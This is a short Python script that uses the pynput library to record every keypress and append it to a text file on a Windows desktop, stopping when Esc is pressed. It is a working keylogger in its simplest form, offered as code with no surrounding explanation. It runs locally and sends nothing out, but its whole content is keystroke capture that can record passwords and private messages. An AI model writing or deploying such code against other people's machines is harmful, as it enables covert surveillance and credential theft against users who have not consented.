from pynput import keyboard


#Path of Logged File
Logged_file = 'C:/users/shami_20topwo/desktop/file.txt'

# Capture input and append in a file
def on_press(key):
    f = open(Logged_file,"a")

    # Removing single quote
    formatted_key = str(key).strip("\'")
    f.write(formatted_key)
    f.close()

# Termination
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()